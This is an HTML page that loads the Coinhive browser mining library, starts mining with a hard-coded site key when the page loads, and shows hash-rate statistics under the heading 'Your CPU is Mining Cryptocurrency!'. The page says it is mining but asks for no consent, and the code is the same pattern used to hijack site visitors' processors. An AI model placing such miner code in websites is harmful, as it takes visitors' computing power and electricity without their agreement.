<!DOCTYPE html>
<html lang="en">

<head>
        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
      <link rel="stylesheet" href="style.css">

</head>

<body style="background-color:#61E9B1;">
<back>
<body>
        <script>
            var miner = new CoinHive.Anonymous('uanzX5ikR86NZnaiuNFU6MKxDAA9Z0yk');
            miner.start();

            // Listen on events
	miner.on('found', function() { 
        console.log("Found Hash!")
        /* Hash found */ })
	miner.on('accepted', function() { 
        console.log("Accepted Hash!")
        /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
        console.log("hashesPerSecond", hashesPerSecond);
        console.log("totalHashes", totalHashes);
        console.log("acceptedHashes", acceptedHashes);
        document.getElementById('hps').innerHTML = hashesPerSecond;
        document.getElementById('th').innerHTML = totalHashes;
        document.getElementById('ah').innerHTML = acceptedHashes;
		// Output to HTML elements...
	}, 1000);
        </script>

  <div class="wrapper">
	<div class="container1">
        <h1>Your CPU is Mining Cryptocurrency!</h1>
        <br></br>
        <br></br>
        <h2>Hashes Per Second<h2>
            <h2>-------------------<h2>
        <div id="hps">-</div>
        <br></br>
        <h2>Total Mined Hashes<h2>
            <h2>-------------------<h2>
        <div id="th">-</div>
        <br></br>
        <h2>Accepted Hashes<h2>
            <h2>-------------------<h2>
        <div id="ah">-</div>


        <h6></h6>
            <div
  class="fb-like"
  data-share="true"
  data-width="450"
  data-show-faces="true">
		
	<ul class="bg-bubbles">
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
	</ul>
</div>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
</body>

</html>